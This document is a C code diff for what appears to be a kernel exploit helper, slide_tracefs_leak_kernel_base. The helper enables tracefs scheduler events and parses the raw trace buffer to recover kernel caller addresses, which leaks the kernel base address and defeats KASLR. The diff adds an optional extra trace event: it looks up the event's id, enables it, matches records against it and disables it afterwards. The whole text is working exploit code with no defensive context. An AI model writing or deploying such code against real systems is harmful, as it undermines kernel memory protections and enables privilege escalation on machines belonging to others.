@@ -5,6 +5,10 @@
 #define SLIDE_TRACEFS_EVENT_ID 109
 #endif
 
+#ifdef SLIDE_TRACEFS_EXTRA_EVENT
+static uint16_t slide_tracefs_extra_event_id;
+#endif
+
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
   if (fd < 0) {
@@ -53,7 +57,13 @@ static int slide_tracefs_parse_page(
     }
     uint16_t event_id = 0;
     memcpy(&event_id, page + record, sizeof(event_id));
-    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+#ifdef SLIDE_TRACEFS_EXTRA_EVENT
+    uint16_t target_id = slide_tracefs_extra_event_id ?
+                         slide_tracefs_extra_event_id : SLIDE_TRACEFS_EVENT_ID;
+#else
+    uint16_t target_id = SLIDE_TRACEFS_EVENT_ID;
+#endif
+    if (event_id == target_id && record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
       uint64_t link_caller =
@@ -81,6 +91,33 @@ static int slide_tracefs_leak_kernel_base(void) {
       SLIDE_TRACEFS_ROOT "/trace";
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+
+#ifdef SLIDE_TRACEFS_EXTRA_EVENT
+  {
+    char path[256];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/events/" SLIDE_TRACEFS_EXTRA_EVENT "/id");
+    int fd = open(path, O_RDONLY | O_CLOEXEC);
+    if (fd >= 0) {
+      char buf[16];
+      ssize_t got = read(fd, buf, sizeof(buf) - 1);
+      close(fd);
+      if (got > 0) {
+        buf[got] = '\0';
+        char *end = NULL;
+        errno = 0;
+        long id = strtol(buf, &end, 10);
+        if (!errno && end > buf && (*end == '\n' || *end == '\0') &&
+            id > 0 && id <= 0xffff) {
+          slide_tracefs_extra_event_id = (uint16_t)id;
+        }
+      }
+    }
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/events/" SLIDE_TRACEFS_EXTRA_EVENT "/enable");
+    slide_tracefs_write(path, "1");
+  }
+#endif
 
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "1") ||
@@ -118,6 +155,14 @@ static int slide_tracefs_leak_kernel_base(void) {
     close(fd);
   }
   slide_tracefs_write(event_enable, "0");
+#ifdef SLIDE_TRACEFS_EXTRA_EVENT
+  {
+    char path[256];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/events/" SLIDE_TRACEFS_EXTRA_EVENT "/enable");
+    slide_tracefs_write(path, "0");
+  }
+#endif
   if (!found) {
     pr_error("slide tracefs worker caller not found\n");
     return 0;
